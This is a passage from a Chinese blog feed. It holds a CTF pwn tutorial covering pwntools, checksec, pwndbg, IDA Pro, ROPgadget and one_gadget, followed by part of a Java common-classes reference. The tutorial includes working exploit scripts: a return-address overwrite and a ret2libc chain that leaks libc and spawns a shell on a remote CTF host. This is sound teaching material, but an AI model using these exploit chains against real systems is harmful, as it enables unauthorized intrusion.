获取符号表。</li><li><strong>rop</strong>：构建 ROP 链。例如，<code>rop = ROP(elf)</code> 创建 ROP 对象，<code>rop.raw</code> 添加原始 gadget 或地址，<code>rop.dump()</code> 查看构建的 ROP 链。</li><li><strong>asm</strong>：汇编和反汇编。例如，<code>asm(shellcraft.sh())</code> 生成 shellcode，<code>disasm(shellcode)</code> 反汇编 shellcode。</li><li><strong>shellcraft</strong>：提供各种 shellcode 模板。例如，<code>shellcraft.sh()</code> 生成执行 <code>/bin/sh</code> 的 shellcode。</li><li><strong>log</strong>：日志记录功能，方便调试。例如，<code>log.info(&#39;message&#39;)</code> 记录信息日志，<code>log.debug(&#39;message&#39;)</code> 记录调试日志。</li><li><strong>cyclic</strong>：生成循环字符串，用于确定缓冲区溢出时的偏移量。例如，<code>cyclic(100)</code> 生成长度为 100 的循环字符串，<code>cyclic_find(&#39;0x61616171&#39;)</code> 查找特定字串的偏移量。</li><li><strong>gdb</strong>：与 gdb 集成，方便调试。例如，<code>gdb.attach(io)</code> 附加 gdb 到进程，<code>gdb.debug(&#39;./vulnerable_program&#39;)</code> 启动 gdb 调试。</li><li><strong>util.packing</strong>：提供数据打包和解包功能。例如，<code>p32(address)</code> 将 32 位整数打包为字节流，<code>u32(data)</code> 将字节流解包为 32 位整数。</li><li><strong>tubes</strong>：封装了各种 I/O 操作，方便与目标程序交互。例如，<code>process</code>、<code>remote</code>、<code>ssh</code> 等类用于创建本地进程、远程连接、SSH 连接等。</li><li><strong>args</strong>：处理命令行参数，方便在脚本中根据参数选择不同的操作。例如，<code>args[&#39;REMOTE&#39;]</code> 获取命令行参数 <code>REMOTE</code> 的值，判断是否为远程连接。</li></ul></li></ol><h3 id="（二）checksec"><a href="#（二）checksec" class="headerlink" title="（二）checksec"></a>（二）checksec</h3><ol><li><p><strong>功能</strong></p><ul><li>查看可执行文件的程序架构信息和保护信息，如是否启用了 NX、RELRO、STACK CANARY 等保护机制。</li></ul></li><li><p><strong>使用示例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec ./vulnerable_program</span><br></pre></td></tr></table></figure></li><li><p><strong>输出说明</strong></p><ul><li><strong>Arch</strong>：程序架构信息，如 <code>amd64</code> 表示 64 位程序。</li><li><strong>RELRO</strong>：<code>Full RELRO</code> 表示 GOT 表完全只读，<code>Partial RELRO</code> 表示部分只读，<code>No RELRO</code> 表示未启用 RELRO 保护。</li><li><strong>Stack</strong>：<code>Canary found</code> 表示启用了栈保护机制。</li><li><strong>NX</strong>：<code>NX enabled</code> 表示栈不可执行，可防止代码注入攻击。</li><li><strong>PIE</strong>：<code>PIE enabled</code> 表示启用了地址空间布局随机化（ASLR），<code>No PIE</code> 表示未启用。</li><li><strong>RPATH</strong>：显示运行时库路径。</li><li><strong>RUNPATH</strong>：显示运行时库路径。</li><li><strong>Symbols</strong>：显示是否包含符号表。</li><li><strong>Fortify</strong>：显示是否启用了 Fortify 保护。</li><li><strong>fortified</strong>：显示已启用 Fortify 保护的函数数量。</li><li><strong>fortifyable</strong>：显示可启用 Fortify 保护的函数总数。</li></ul></li></ol><h3 id="（三）gdb-pwndbg"><a href="#（三）gdb-pwndbg" class="headerlink" title="（三）gdb+pwndbg"></a>（三）gdb+pwndbg</h3><ol><li><p><strong>安装</strong></p><ul><li>pwndbg 是 gdb 的插件，可通过 <code>git clone https://github.com/pwndbg/pwndbg</code> 命令下载并安装。</li></ul></li><li><p><strong>功能</strong></p><ul><li>用于调试二进制程序，支持查看寄存器、内存、栈帧等信息，以及设置断点、单步执行等操作。</li></ul></li><li><p><strong>常用命令</strong></p><ul><li><code>b main</code>：在 <code>main</code> 函数处设置断点。</li><li><code>r</code>：启动程序并传递输入参数。</li><li><code>continue</code> 或 <code>c</code>：继续程序执行，直到下一个断点。</li><li><code>next</code> 或 <code>n</code>：单步执行程序，跳过函数调用。</li><li><code>step</code> 或 <code>s</code>：单步执行程序，进入函数调用。</li><li><code>x/x $rsp</code>：查看栈顶内容。</li><li><code>info registers</code>：查看寄存器信息。</li><li><code>pwndbg</code>：显示 pwndbg 的调试界面，包含栈、寄存器、内存等信息。</li><li><code>break</code> 或 <code>b</code>：设置断点。例如，<code>b *0x0000000000401186</code> 在指定地址设置断点。</li><li><code>delete</code> 或 <code>d</code>：删除断点。例如，<code>d 1</code> 删除编号为 1 的断点。</li><li><code>finish</code>：执行直到当前函数返回。</li><li><code>until</code> 或 <code>u</code>：执行直到指定地址。</li><li><code>print</code> 或 <code>p</code>：打印变量或表达式的值。例如，<code>p $rax</code> 打印寄存器 <code>rax</code> 的值。</li><li><code>set</code>：设置变量或寄存器的值。例如，<code>set $rax = 0x1234</code> 将寄存器 <code>rax</code> 的值设置为 <code>0x1234</code>。</li><li><code>disassemble</code> 或 <code>disass</code>：反汇编代码。例如，<code>disass main</code> 反汇编 <code>main</code> 函数。</li><li><code>info breakpoints</code> 或 <code>info b</code>：查看所有断点信息。</li><li><code>detach</code>：从进程分离调试器。</li><li><code>quit</code> 或 <code>q</code>：退出 gdb。</li></ul></li><li><p><strong>结合 pwntools 使用</strong></p><ul><li>在调试过程中，可以结合 pwntools 的 <code>context</code> 模块设置架构和字节序，方便分析和构造 payload。例如，在 pwntools 脚本中，通过 <code>context.arch = &#39;amd64&#39;</code> 设置架构，然后在 gdb 中调试时，可以更方便地查看相应架构下的寄存器和内存布局。</li></ul></li></ol><h3 id="（四）IDA-Pro"><a href="#（四）IDA-Pro" class="headerlink" title="（四）IDA Pro"></a>（四）IDA Pro</h3><ol><li><p><strong>功能</strong></p><ul><li>用于逆向工程和二进制代码分析，将汇编代码转换为 C 语言代码，便于理解程序逻辑。</li></ul></li><li><p><strong>常用快捷键</strong></p><ul><li>空格键：切换文本视图 / 图表视图。</li><li><code>Shift + F12</code>：列出汇编语言代码中的字符串值。</li><li><code>F5</code>：将汇编语言代码转换为 C 语言代码。</li><li><code>Esc</code>：返回上一层代码。</li><li><code>G</code>：跳转至指定地址。</li></ul></li><li><p><strong>使用技巧</strong></p><ul><li><strong>分析函数</strong>：在 IDA 中，函数是程序的基本组成单元。通过查看函数的调用关系、参数传递、局部变量等信息，可以理解程序的功能和逻辑。例如，通过查看 <code>main</code> 函数的调用关系，可以了解程序的入口点和其他关键函数的调用顺序。</li><li><strong>查找关键代码</strong>：在分析漏洞时，需要重点关注可能导致漏洞的关键代码，如缓冲区拷贝函数（<code>strcpy</code>、<code>sprintf</code> 等）、格式化字符串函数（<code>printf</code>、<code>sprintf</code> 等）、堆操作函数（<code>malloc</code>、<code>free</code> 等）。通过搜索这些函数的调用位置，可以快速定位到可能存在问题的代码段。</li><li><strong>查看数据结构</strong>：IDA 可以解析程序中的数据结构，如结构体、数组等。通过查看数据结构的定义和使用情况，可以更好地理解程序的数据组织和操作方式，有助于分析漏洞的成因和利用方式。</li><li><strong>交叉引用</strong>：IDA 提供了强大的交叉引用功能，可以查看某个函数、变量或地址在程序中的所有引用位置。这对于理解程序的整体结构和逻辑非常有帮助，也能辅助发现潜在的漏洞利用路径。</li><li><strong>注释和标记</strong>：在分析过程中，可以为关键代码、函数、变量等添加注释和标记，方便后续的回顾和整理。这有助于提高分析效率，特别是在处理复杂的二进制程序时。</li></ul></li></ol><h3 id="（五）ROPgadget"><a href="#（五）ROPgadget" class="headerlink" title="（五）ROPgadget"></a>（五）ROPgadget</h3><ol><li><p><strong>功能</strong></p><ul><li>检索二进制文件中存在的 ROP 操作链，用于构建恶意执行流。</li></ul></li><li><p><strong>使用示例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./vulnerable_program --only &quot;pop;ret;&quot; | grep &quot;word&quot;</span><br></pre></td></tr></table></figure></li><li><p><strong>输出说明</strong></p><ul><li>显示符合条件的 gadget 地址和指令序列，帮助构造 ROP 链。例如，输出 <code>0x0000000000401234 : pop rdi; ret</code> 表示在地址 <code>0x0000000000401234</code> 处存在一个 <code>pop rdi; ret</code> 的 gadget，可以用于在 ROP 链中设置 <code>rdi</code> 寄存器的值。</li></ul></li><li><p><strong>常见 gadget 类型</strong></p><ul><li><strong>寄存器弹出（pop）</strong>：如 <code>pop rax; ret</code>，用于将栈顶值弹出到指定寄存器。</li><li><strong>内存操作</strong>：如 <code>mov [rax], rdi; ret</code>，用于将寄存器值写入内存。</li><li><strong>算术运算</strong>：如 <code>add rax, rbx; ret</code>，用于执行算术运算。</li><li><strong>控制流转移</strong>：如 <code>jmp rax</code>，用于跳转到指定地址执行。</li><li><strong>函数调用</strong>：如 <code>call rax</code>，用于调用指定地址的函数。</li></ul></li><li><p><strong>构造 ROP 链</strong></p><ul><li>根据漏洞利用的需求，选择合适的 gadget 组合，形成完整的 ROP 链。例如，为了调用 <code>system(&quot;/bin/sh&quot;)</code>，需要找到 <code>pop rdi; ret</code>、<code>system</code> 函数地址以及 <code>&quot;/bin/sh&quot;</code> 字符串地址等 gadget，并按照正确的顺序排列，形成 ROP 链。</li></ul></li></ol><h3 id="（六）one-gadget"><a href="#（六）one-gadget" class="headerlink" title="（六）one_gadget"></a>（六）one_gadget</h3><ol><li><p><strong>功能</strong></p><ul><li>自动搜索并生成利用 libc 中特定 gadget 来构造 payload，简化提权过程。</li></ul></li><li><p><strong>使用示例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget ./libc.so</span><br></pre></td></tr></table></figure></li><li><p><strong>输出说明</strong></p><ul><li>输出可利用的 gadget 地址，直接用于覆盖返回地址实现提权。例如，输出 <code>0x00000000004f322</code> 表示在 <code>libc.so</code> 文件中存在一个可利用的 gadget，将其地址覆盖到返回地址处，即可实现提权操作。</li></ul></li><li><p><strong>使用场景</strong></p><ul><li>当程序启用了 NX 保护，无法直接注入 shellcode 时，可以利用 one_gadget 找到 libc 中的 gadget 地址，通过 ROP 链调用这些 gadget 来实现提权。</li></ul></li></ol><h2 id="四、解题步骤示例"><a href="#四、解题步骤示例" class="headerlink" title="四、解题步骤示例"></a>四、解题步骤示例</h2><h3 id="（一）栈溢出"><a href="#（一）栈溢出" class="headerlink" title="（一）栈溢出"></a>（一）栈溢出</h3><ol><li><p><strong>使用 checksec 查看程序保护机制</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec ./vulnerable_program</span><br></pre></td></tr></table></figure><p>根据输出结果判断是否启用了 NX、RELRO 等保护机制，确定漏洞利用的可行性。例如，如果 <code>NX</code> 为 <code>NX enabled</code>，则需要使用 ROP 链等方式绕过 NX 保护；如果 <code>RELRO</code> 为 <code>Full RELRO</code>，则 GOT 表完全只读，无法直接覆盖 GOT 表中的函数指针。</p></li><li><p><strong>使用 IDA Pro 或 gdb+pwndbg 分析程序逻辑</strong></p><ul><li>在 IDA Pro 中打开程序，查看函数调用关系和关键代码逻辑。例如，找到程序中存在缓冲区溢出的函数，确定缓冲区大小、返回地址位置等关键信息。</li><li>使用 gdb+pwndbg 设置断点，单步调试，观察寄存器和内存变化。例如，在漏洞函数处设置断点，运行程序并输入测试数据，查看栈的布局、返回地址的变化等，进一步确认漏洞的细节。</li></ul></li><li><p><strong>编写漏洞利用脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span>  <span class="comment"># 设置架构</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span>  <span class="comment"># 设置字节序</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建本地进程连接</span></span><br><span class="line">io = process(<span class="string">&#x27;./vulnerable_program&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 payload</span></span><br><span class="line">buffer_size = <span class="number">0x20</span></span><br><span class="line">return_address = <span class="number">0x0000000000401186</span>  <span class="comment"># 目标返回地址</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * buffer_size + p64(return_address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 payload</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交互</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>该脚本通过 pwntools 发送构造好的 payload，覆盖返回地址，使程序跳转到指定地址执行，从而实现漏洞利用。在实际解题中，可能需要根据具体的漏洞类型和保护机制，选择不同的利用方式，如构造 ROP 链、注入 shellcode 等。</p></li></ol><h3 id="（二）ret2libc"><a href="#（二）ret2libc" class="headerlink" title="（二）ret2libc"></a>（二）ret2libc</h3><ol><li><p><strong>使用 checksec 查看程序保护机制</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec ./vulnerable_program</span><br></pre></td></tr></table></figure><p>确认程序是否启用了 NX 保护，若启用了 NX 保护，则需要使用 ret2libc 技巧。</p></li><li><p><strong>在 IDA Pro 中分析程序</strong></p><ul><li>找到程序中存在溢出的函数，例如 <code>encrypt()</code> 函数中的 <code>gets()</code> 函数没有限制读入的长度，可以造成溢出。</li><li>确定 <code>system()</code> 函数和 <code>/bin/sh</code> 字符串在 libc 中的地址。</li></ul></li><li><p><strong>使用 ROPgadget 查找 gadget</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./vulnerable_program --only &quot;pop;ret;&quot; | grep &quot;word&quot;</span><br></pre></td></tr></table></figure><p>找到 <code>pop rdi; ret</code> 等 gadget 的地址。</p></li><li><p><strong>编写漏洞利用脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26887</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./vulnerable_program&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x400b28</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;\0&#x27;</span> + <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x50</span> - <span class="number">1</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>, payload)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">offset = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh = offset + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system = offset + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\0&#x27;</span> + <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x50</span> - <span class="number">1</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>该脚本通过泄露 <code>puts</code> 函数的地址，计算出 libc 的基地址，然后构造 ROP 链调用 <code>system(&quot;/bin/sh&quot;)</code>，实现提权操作。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java常用类总结</title>
      <link href="/posts/9fd071e2.html"/>
      <url>/posts/9fd071e2.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文主要介绍Java常用类的方法及用法。</p></blockquote><h1 id="Java常用类及方法总结"><a href="#Java常用类及方法总结" class="headerlink" title="Java常用类及方法总结"></a>Java常用类及方法总结</h1><h2 id="1-String-类"><a href="#1-String-类" class="headerlink" title="1. String 类"></a>1. <code>String</code> 类</h2><p>用于表示不可变的字符串。</p><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>length()</code></td><td>获取字符串长度</td><td>无</td><td><code>int</code></td></tr><tr><td><code>charAt(int index)</code></td><td>获取指定索引处的字符</td><td>索引位置</td><td><code>char</code></td></tr><tr><td><code>substring(int beginIndex, int endIndex)</code></td><td>获取从开始索引到结束索引的子字符串（不包括结束索引）</td><td>开始索引、结束索引</td><td><code>String</code></td></tr><tr><td><code>indexOf(int ch)</code></td><td>返回指定字符在字符串中首次出现的索引</td><td>要查找的字符</td><td><code>int</code></td></tr><tr><td><code>lastIndexOf(int ch)</code></td><td>返回指定字符在字符串中最后一次出现的索引</td><td>要查找的字符</td><td><code>int</code></td></tr><tr><td><code>startsWith(String prefix)</code></td><td>检查字符串是否以指定前缀开头</td><td>前缀字符串</td><td><code>boolean</code></td></tr><tr><td><code>endsWith(String suffix)</code></td><td>检查字符串是否以指定后缀结尾</td><td>后缀字符串</td><td><code>boolean</code></td></tr><tr><td><code>contains(CharSequence s)</code></td><td>检查字符串是否包含指定的字符序列</td><td>要检查的字符序列</td><td><code>boolean</code></td></tr><tr><td><code>replace(CharSequence target, CharSequence replacement)</code></td><td>将字符串中的指定字符序列替换为新的字符序列</td><td>要替换的目标序列、替换后的序列</td><td><code>String</code></td></tr><tr><td><code>toLowerCase()</code></td><td>将字符串转换为小写</td><td>无</td><td><code>String</code></td></tr><tr><td><code>toUpperCase()</code></td><td>将字符串转换为大写</td><td>无</td><td><code>String</code></td></tr><tr><td><code>trim()</code></td><td>去除字符串两端的空白字符</td><td>无</td><td><code>String</code></td></tr><tr><td><code>split(String regex)</code></td><td>根据给定的正则表达式拆分字符串</td><td>正则表达式</td><td><code>String[]</code></td></tr></tbody></table></div><h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;长度: &quot;</span> + str.length()); <span class="comment">// 13</span></span><br><span class="line">System.out.println(<span class="string">&quot;第5个字符: &quot;</span> + str.charAt(<span class="number">4</span>)); <span class="comment">// o</span></span><br><span class="line">System.out.println(<span class="string">&quot;子字符串: &quot;</span> + str.substring(<span class="number">7</span>, <span class="number">12</span>)); <span class="comment">// World</span></span><br><span class="line">System.out.println(<span class="string">&quot;索引: &quot;</span> + str.indexOf(<span class="string">&#x27;W&#x27;</span>)); <span class="comment">// 7</span></span><br><span class="line">System.out.println(<span class="string">&quot;是否以Hello开头: &quot;</span> + str.startsWith(<span class="string">&quot;Hello&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">System.out.println(<span class="string">&quot;替换后: &quot;</span> + str.replace(<span class="string">&quot;World&quot;</span>, <span class="string">&quot;Java&quot;</span>)); <span class="comment">// Hello, Java!</span></span><br></pre></td></tr></table></figure><h2 id="2-StringBuilder-类"><a href="#2-StringBuilder-类" class="headerlink" title="2. StringBuilder 类"></a>2. <code>StringBuilder</code> 类</h2><p>用于可变字符串的操作，效率较高。</p><h3 id="常用方法-1"><a href="#常用方法-1" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>append(String str)</code></td><td>在字符串末尾追加指定字符串</td><td>要追加的字符串</td><td><code>StringBuilder</code></td></tr><tr><td><code>insert(int offset, String str)</code></td><td>在指定位置插入字符串</td><td>插入位置、要插入的字符串</td><td><code>StringBuilder</code></td></tr><tr><td><code>delete(int start, int end)</code></td><td>删除指定范围内的字符</td><td>起始索引、结束索引</td><td><code>StringBuilder</code></td></tr><tr><td><code>reverse()</code></td><td>反转字符串</td><td>无</td><td><code>StringBuilder</code></td></tr><tr><td><code>toString()</code></td><td>将<code>StringBuilder</code>转换为<code>String</code></td><td>无</td><td><code>String</code></td></tr></tbody></table></div><h3 id="示例代码-1"><a href="#示例代码-1" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">sb.append(<span class="string">&quot; World&quot;</span>); <span class="comment">// Hello World</span></span><br><span class="line">sb.insert(<span class="number">5</span>, <span class="string">&quot;,&quot;</span>); <span class="comment">// Hello, World</span></span><br><span class="line">sb.delete(<span class="number">5</span>, <span class="number">6</span>); <span class="comment">// Hello World</span></span><br><span class="line">sb.reverse(); <span class="comment">// dlroW olleH</span></span><br><span class="line">System.out.println(sb.toString());</span><br></pre></td></tr></table></figure><h2 id="3-ArrayList-类"><a href="#3-ArrayList-类" class="headerlink" title="3. ArrayList 类"></a>3. <code>ArrayList</code> 类</h2><p>动态数组，允许随机访问元素。</p><h3 id="常用方法-2"><a href="#常用方法-2" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>add(E e)</code></td><td>添加元素到列表末尾</td><td>要添加的元素</td><td><code>boolean</code></td></tr><tr><td><code>add(int index, E e)</code></td><td>在指定位置插入元素</td><td>插入位置、要添加的元素</td><td><code>void</code></td></tr><tr><td><code>remove(int index)</code></td><td>移除指定位置的元素</td><td>要移除的元素索引</td><td><code>E</code></td></tr><tr><td><code>get(int index)</code></td><td>获取指定位置的元素</td><td>元素索引</td><td><code>E</code></td></tr><tr><td><code>set(int index, E e)</code></td><td>替换指定位置的元素</td><td>元素索引、新元素</td><td><code>E</code></td></tr><tr><td><code>size()</code></td><td>获取列表中的元素个数</td><td>无</td><td><code>int</code></td></tr><tr><td><code>contains(Object o)</code></td><td>检查列表是否包含指定元素</td><td>要检查的元素</td><td><code>boolean</code></td></tr><tr><td><code>indexOf(Object o)</code></td><td>返回指定元素首次出现的索引</td><td>要查找的元素</td><td><code>int</code></td></tr><tr><td><code>lastIndexOf(Object o)</code></td><td>返回指定元素最后一次出现的索引</td><td>要查找的元素</td><td><code>int</code></td></tr><tr><td><code>clear()</code></td><td>清空列表中的所有元素</td><td>无</td><td><code>void</code></td></tr></tbody></table></div><h3 id="示例代码-2"><a href="#示例代码-2" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">list.add(<span class="string">&quot;Apple&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;Banana&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;Orange&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;元素个数: &quot;</span> + list.size()); <span class="comment">// 3</span></span><br><span class="line">System.out.println(<span class="string">&quot;第二个元素: &quot;</span> + list.get(<span class="number">1</span>)); <span class="comment">// Banana</span></span><br><span class="line">list.set(<span class="number">1</span>, <span class="string">&quot;Grape&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;修改后的列表: &quot;</span> + list); <span class="comment">// [Apple, Grape, Orange]</span></span><br><span class="line">list.remove(<span class="number">2</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;移除后的列表: &quot;</span> + list); <span class="comment">// [Apple, Grape]</span></span><br></pre></td></tr></table></figure><h2 id="4-HashMap-类"><a href="#4-HashMap-类" class="headerlink" title="4. HashMap 类"></a>4. <code>HashMap</code> 类</h2><p>基于哈希表的映射，允许<code>null</code>键和<code>null</code>值。</p><h3 id="常用方法-3"><a href="#常用方法-3" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>put(K key, V value)</code></td><td>将键值对插入映射</td><td>键、值</td><td><code>V</code></td></tr><tr><td><code>get(Object key)</code></td><td>获取指定键对应的值</td><td>键</td><td><code>V</code></td></tr><tr><td><code>remove(Object key)</code></td><td>移除指定键及其对应的值</td><td>键</td><td><code>V</code></td></tr><tr><td><code>containsKey(Object key)</code></td><td>检查映射是否包含指定键</td><td>键</td><td><code>boolean</code></td></tr><tr><td><code>containsValue(Object value)</code></td><td>检查映射是否包含指定值</td><td>值</td><td><code>boolean</code></td></tr><tr><td><code>size()</code></td><td>获取映射中的键值对个数</td><td>无</td><td><code>int</code></td></tr><tr><td><code>isEmpty()</code></td><td>检查映射是否为空</td><td>无</td><td><code>boolean</code></td></tr><tr><td><code>clear()</code></td><td>清空映射中的所有键值对</td><td>无</td><td><code>void</code></td></tr><tr><td><code>keySet()</code></td><td>返回映射中所有键的集合视图</td><td>无</td><td><code>Set&lt;K&gt;</code></td></tr><tr><td><code>values()</code></td><td>返回映射中所有值的集合视图</td><td>无</td><td><code>Collection&lt;V&gt;</code></td></tr></tbody></table></div><h3 id="示例代码-3"><a href="#示例代码-3" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;String, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;Apple&quot;</span>, <span class="number">1</span>);</span><br><span class="line">map.put(<span class="string">&quot;Banana&quot;</span>, <span class="number">2</span>);</span><br><span class="line">map.put(<span class="string">&quot;Orange&quot;</span>, <span class="number">3</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;Apple的值: &quot;</span> + map.get(<span class="string">&quot;Apple&quot;</span>)); <span class="comment">// 1</span></span><br><span class="line">System.out.println(<span class="string">&quot;映射大小: 